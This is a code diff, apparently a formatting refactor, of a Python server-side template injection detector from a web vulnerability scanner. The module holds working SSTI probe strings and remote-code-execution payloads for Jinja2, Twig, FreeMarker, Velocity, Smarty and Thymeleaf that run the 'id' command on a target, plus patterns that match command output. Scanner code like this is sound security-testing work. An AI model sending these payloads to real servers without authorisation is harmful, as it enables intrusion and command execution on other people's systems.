@@ -4,20 +4,20 @@ SSTI (服务端模板注入) 检测器
 检测各种模板引擎的注入漏洞
 """
 
-from typing import List, Optional, Dict, Any, Tuple
-import re
 import logging
-from urllib.parse import urlparse, parse_qs
+import re
+from typing import Any, Dict, List, Optional, Tuple
+from urllib.parse import parse_qs, urlparse
 
 from ..base import BaseDetector
-from ..result import DetectionResult, Severity, DetectorType
 from ..factory import register_detector
-from ..payloads import get_payloads, PayloadCategory
+from ..payloads import PayloadCategory, get_payloads
+from ..result import DetectionResult, DetectorType, Severity
 
 logger = logging.getLogger(__name__)
 
 
-@register_detector('ssti')
+@register_detector("ssti")
 class SSTIDetector(BaseDetector):
     """SSTI (服务端模板注入) 检测器
 
@@ -36,60 +36,58 @@ class SSTIDetector(BaseDetector):
         results = detector.detect("https://example.com/greet", params={"name": "test"})
     """
 
-    name = 'ssti'
-    description = '服务端模板注入漏洞检测器'
-    vuln_type = 'ssti'
+    name = "ssti"
+    description = "服务端模板注入漏洞检测器"
+    vuln_type = "ssti"
     severity = Severity.CRITICAL
     detector_type = DetectorType.INJECTION
-    version = '2.0.0'
+    version = "2.0.0"
 
     # 模板引擎探测 payload 和预期响应
     PROBE_PAYLOADS = [
         # 通用数学表达式探测
-        ('{{7*7}}', '49', ['jinja2', 'twig', 'nunjucks']),
-        ('${7*7}', '49', ['freemarker', 'velocity', 'groovy']),
-        ('#{7*7}', '49', ['thymeleaf', 'spring_el']),
-        ('<%= 7*7 %>', '49', ['erb', 'ejs']),
-        ('${7*7}', '49', ['jsp_el']),
-        ("{{7*'7'}}", '7777777', ['jinja2']),  # Jinja2 特有
-        ('${{7*7}}', '49', ['thymeleaf']),
-        ('*{7*7}', '49', ['thymeleaf']),
-
+        ("{{7*7}}", "49", ["jinja2", "twig", "nunjucks"]),
+        ("${7*7}", "49", ["freemarker", "velocity", "groovy"]),
+        ("#{7*7}", "49", ["thymeleaf", "spring_el"]),
+        ("<%= 7*7 %>", "49", ["erb", "ejs"]),
+        ("${7*7}", "49", ["jsp_el"]),
+        ("{{7*'7'}}", "7777777", ["jinja2"]),  # Jinja2 特有
+        ("${{7*7}}", "49", ["thymeleaf"]),
+        ("*{7*7}", "49", ["thymeleaf"]),
         # 字符串操作探测
-        ("{{\"foo\".upper()}}", 'FOO', ['jinja2']),
-        ("${\"foo\"?upper_case}", 'FOO', ['freemarker']),
-        ("{{\"foo\"|upper}}", 'FOO', ['twig']),
-
+        ('{{"foo".upper()}}', "FOO", ["jinja2"]),
+        ('${"foo"?upper_case}', "FOO", ["freemarker"]),
+        ('{{"foo"|upper}}', "FOO", ["twig"]),
         # 随机数探测（避免缓存）
-        ('{{range(1,10)|random}}', r'[1-9]', ['jinja2', 'twig']),
+        ("{{range(1,10)|random}}", r"[1-9]", ["jinja2", "twig"]),
     ]
 
     # RCE 探测 payload
     RCE_PAYLOADS = {
-        'jinja2': [
+        "jinja2": [
             "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
             "{{''.__class__.__mro__[2].__subclasses__()}}",
             "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
             "{{lipsum.__globals__['os'].popen('id').read()}}",
             "{{cycler.__init__.__globals__.os.popen('id').read()}}",
         ],
-        'twig': [
+        "twig": [
             "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
             "{{['id']|filter('system')}}",
             "{{_self.env.setCache('twig.cache.file')}}{{_self.env.loadTemplate('system')}}",
         ],
-        'freemarker': [
+        "freemarker": [
             '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
-            '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
+            '${"freemarker.template.utility.Execute"?new()("id")}',
         ],
-        'velocity': [
+        "velocity": [
             "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
         ],
-        'smarty': [
+        "smarty": [
             "{php}echo `id`;{/php}",
             "{system('id')}",
         ],
-        'thymeleaf': [
+        "thymeleaf": [
             "__${T(java.lang.Runtime).getRuntime().exec('id')}__::",
             "*{T(java.lang.Runtime).getRuntime().exec('id')}",
         ],
@@ -97,9 +95,9 @@ class SSTIDetector(BaseDetector):
 
     # 命令执行成功标志
     RCE_SUCCESS_PATTERNS = [
-        r'uid=\d+\([a-z_][a-z0-9_-]*\)',
-        r'root:x?:0:0:',
-        r'\[subclass\s+\d+\]',
+        r"uid=\d+\([a-z_][a-z0-9_-]*\)",
+        r"root:x?:0:0:",
+        r"\[subclass\s+\d+\]",
     ]
 
     def __init__(self, config: Optional[Dict[str, Any]] = None):
@@ -114,19 +112,17 @@ class SSTIDetector(BaseDetector):
         super().__init__(config)
 
         # 加载 payload
-        max_payloads = self.config.get('max_payloads', 20)
+        max_payloads = self.config.get("max_payloads", 20)
         self.payloads = self._enhance_payloads(
             get_payloads(PayloadCategory.SSTI, limit=max_payloads)
         )
 
         # 编译成功模式
-        self._rce_patterns = [
-            re.compile(p, re.IGNORECASE) for p in self.RCE_SUCCESS_PATTERNS
-        ]
+        self._rce_patterns = [re.compile(p, re.IGNORECASE) for p in self.RCE_SUCCESS_PATTERNS]
 
         # 配置
-        self.check_rce = self.config.get('check_rce', True)
-        self.detect_engine = self.config.get('detect_engine', True)
+        self.check_rce = self.config.get("check_rce", True)
+        self.detect_engine = self.config.get("detect_engine", True)
 
     def detect(self, url: str, **kwargs) -> List[DetectionResult]:
         """检测 SSTI 漏洞
@@ -146,10 +142,10 @@ class SSTIDetector(BaseDetector):
         results: List[DetectionResult] = []
 
         # 获取参数
-        params = kwargs.get('params', {})
-        data = kwargs.get('data', {})
-        method = kwargs.get('method', 'GET').upper()
-        headers = kwargs.get('headers', {})
+        params = kwargs.get("params", {})
+        data = kwargs.get("data", {})
+        method = kwargs.get("method", "GET").upper()
+        headers = kwargs.get("headers", {})
 
         # 解析 URL 参数
         if not params:
@@ -158,23 +154,19 @@ class SSTIDetector(BaseDetector):
 
         # 测试 GET 参数
         if params:
-            param_results = self._test_parameters(url, params, 'GET', headers)
+            param_results = self._test_parameters(url, params, "GET", headers)
             results.extend(param_results)
 
         # 测试 POST 数据
-        if data and method == 'POST':
-            data_results = self._test_parameters(url, data, 'POST', headers)
+        if data and method == "POST":
+            data_results = self._test_parameters(url, data, "POST", headers)
             results.extend(data_results)
 
         self._log_detection_end(url, results)
         return results
 
     def _test_parameters(
-        self,
-        url: str,
-        params: Dict[str, str],
-        method: str,
-        headers: Dict[str, str]
+        self, url: str, params: Dict[str, str], method: str, headers: Dict[str, str]
     ) -> List[DetectionResult]:
         """测试参数中的 SSTI
 
@@ -201,15 +193,13 @@ class SSTIDetector(BaseDetector):
 
                 # 第二步：如果检测到模板引擎，尝试 RCE
                 if self.check_rce and engine in self.RCE_PAYLOADS:
-                    rce_result = self._check_rce(
-                        url, params, param_name, engine, method, headers
-                    )
+                    rce_result = self._check_rce(url, params, param_name, engine, method, headers)
                     if rce_result:
                         rce_possible = True
                         confidence = 0.95
                         evidence = rce_result
 
-                test_payload = evidence.get('payload', '')
+                test_payload = evidence.get("payload", "")
                 test_params = params.copy()
                 if param_name:
                     test_params[param_name] = test_payload
@@ -217,28 +207,27 @@ class SSTIDetector(BaseDetector):
                     method=method,
                     url=url,
                     headers=headers,
-                    params=test_params if method == 'GET' else None,
-                    data=test_params if method != 'GET' else None
+                    params=test_params if method == "GET" else None,
+                    data=test_params if method != "GET" else None,
                 )
-                results.append(self._create_result(
-                    url=url,
-                    vulnerable=True,
-                    param=param_name,
-                    payload=test_payload,
-                    evidence=evidence.get('evidence', ''),
-                    confidence=confidence,
-                    verified=rce_possible,
-                    request=request_info,
-                    remediation="使用安全的模板引擎配置，禁用危险的函数和对象访问",
-                    references=[
-                        "https://portswigger.net/research/server-side-template-injection",
-                        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection"
-                    ],
-                    extra={
-                        'template_engine': engine,
-                        'rce_possible': rce_possible
-                    }
-                ))
+                results.append(
+                    self._create_result(
+                        url=url,
+                        vulnerable=True,
+                        param=param_name,
+                        payload=test_payload,
+                        evidence=evidence.get("evidence", ""),
+                        confidence=confidence,
+                        verified=rce_possible,
+                        request=request_info,
+                        remediation="使用安全的模板引擎配置，禁用危险的函数和对象访问",
+                        references=[
+                            "https://portswigger.net/research/server-side-template-injection",
+                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection",
+                        ],
+                        extra={"template_engine": engine, "rce_possible": rce_possible},
+                    )
+                )
 
         return results
 
@@ -248,7 +237,7 @@ class SSTIDetector(BaseDetector):
         params: Dict[str, str],
         param_name: str,
         method: str,
-        headers: Dict[str, str]
+        headers: Dict[str, str],
     ) -> Tuple[Optional[str], Dict[str, Any]]:
         """探测模板注入
 
@@ -267,26 +256,32 @@ class SSTIDetector(BaseDetector):
             test_params[param_name] = payload
 
             try:
-                if method == 'GET':
+                if method == "GET":
                     response = self.http_client.get(url, params=test_params, headers=headers)
                 else:
                     response = self.http_client.post(url, data=test_params, headers=headers)
 
                 # 检查预期响应
-                if expected.startswith(r'['):
+                if expected.startswith(r"["):
                     # 正则匹配
                     if re.search(expected, response.text):
-                        return (engines[0], {
-                            'payload': payload,
-                            'evidence': f"正则匹配: {expected}",
-                            'expected': expected
-                        })
+                        return (
+                            engines[0],
+                            {
+                                "payload": payload,
+                                "evidence": f"正则匹配: {expected}",
+                                "expected": expected,
+                            },
+                        )
                 elif expected in response.text:
-                    return (engines[0], {
-                        'payload': payload,
-                        'evidence': f"响应包含预期输出: {expected}",
-                        'expected': expected
-                    })
+                    return (
+                        engines[0],
+                        {
+                            "payload": payload,
+                            "evidence": f"响应包含预期输出: {expected}",
+                            "expected": expected,
+                        },
+                    )
 
             except Exception as e:
                 logger.debug(f"SSTI 探测失败: {e}")
@@ -300,7 +295,7 @@ class SSTIDetector(BaseDetector):
         param_name: str,
         engine: str,
         method: str,
-        headers: Dict[str, str]
+        headers: Dict[str, str],
     ) -> Optional[Dict[str, Any]]:
         """检测 RCE
 
@@ -322,7 +317,7 @@ class SSTIDetector(BaseDetector):
             test_params[param_name] = payload
 
             try:
-                if method == 'GET':
+                if method == "GET":
                     response = self.http_client.get(url, params=test_params, headers=headers)
                 else:
                     response = self.http_client.post(url, data=test_params, headers=headers)
@@ -332,9 +327,9 @@ class SSTIDetector(BaseDetector):
                     match = pattern.search(response.text)
                     if match:
                         return {
-                            'payload': payload,
-                            'evidence': match.group(0),
-                            'rce_confirmed': True
+                            "payload": payload,
+                            "evidence": match.group(0),
+                            "rce_confirmed": True,
                         }
 
             except Exception as e:
